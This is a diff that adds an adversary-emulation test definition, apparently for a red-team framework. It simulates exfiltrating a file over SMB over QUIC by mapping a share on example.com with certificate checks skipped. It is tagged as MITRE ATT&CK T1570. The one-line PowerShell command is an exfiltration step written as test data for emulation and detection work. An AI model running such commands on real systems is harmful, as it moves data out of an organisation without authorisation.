@@ -1,0 +1,20 @@
+- description: "Simulates an attacker exfiltrating data over SMB over QUIC using the\
+    \ New-SmbMapping command.\nPrerequisites:\n  - A file server running Windows Server\
+    \ 2022 Datacenter: Azure Edition\n  - A Windows 11 computer\n  - Windows Admin\
+    \ Center\n"
+  id: 4de0ba15-6624-9a72-e81e-74707cc91a00
+  name: Exfiltration Over SMB over QUIC (New-SmbMapping)
+  platforms:
+    windows:
+      psh:
+        cleanup: ''
+        command: New-SmbMapping -RemotePath '\\example.com\sales' -TransportType QUIC
+          -SkipCertificateCheck; copy 'C:\path\to\file.txt' 'Z:\'
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
+        payloads: []
+  tactic: lateral-movement
+  technique:
+    attack_id: T1570
+    name: Lateral Tool Transfer
